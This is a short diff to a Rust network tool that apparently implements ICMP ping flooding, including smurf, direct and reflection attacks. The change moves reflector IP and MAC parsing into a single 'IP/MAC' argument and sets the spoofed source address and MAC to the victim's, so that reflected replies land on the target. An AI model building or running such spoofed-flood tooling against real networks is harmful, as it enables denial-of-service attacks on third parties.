@@ -1,12 +1,12 @@
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
-use std::net::Ipv4Addr;
+use std::{net::Ipv4Addr, mem};
 use crate::engines::PingArgs;
 use crate::generators::RandValues;
 use crate::iface::IfaceInfo;
 use crate::pkt_builder::PacketBuilder;
 use crate::sockets::Layer2RawSocket;
-use crate::utils::{ inline_display, get_first_and_last_ip, CtrlCHandler, abort, parse_mac };
+use crate::utils::{ inline_display, get_first_and_last_ip, CtrlCHandler, abort, parse_mac, parse_ip };
 
 
 
@@ -58,7 +58,7 @@ impl PingFlooder {
     fn set_pkt_info_for(&mut self) {
         if self.args.smurf {
             self.smurf_attack();
-        } else if self.args.reflector_ip.is_some() {
+        } else if self.args.reflector.is_some() {
             self.reflection_attack();
         } else {
             self.direct_attack();
@@ -77,14 +77,18 @@ impl PingFlooder {
 
 
     fn reflection_attack(&mut self) {
+        let reflector        = mem::take(&mut self.args.reflector);
+        let reflector_str    = reflector.as_deref().unwrap_or_default();
+        let parts: Vec<&str> = reflector_str.split('/').collect();
+
+        if parts.len() != 2 {
+            abort(format!("Invalid IP and/or MAC format: {}", reflector_str));
+        }
+
         self.pkt_data.src_ip  = Some(self.args.target_ip);
         self.pkt_data.src_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
-        self.pkt_data.dst_ip  = self.args.reflector_ip;
-        self.pkt_data.dst_mac = if self.args.reflector_mac.is_none() {
-                None 
-            } else {
-                self.resolve_mac(self.args.reflector_mac.clone())
-            };
+        self.pkt_data.dst_ip  = Some(parse_ip(&parts[0]));
+        self.pkt_data.dst_mac = self.resolve_mac(Some(parts[1].to_string()));
     }
 
 
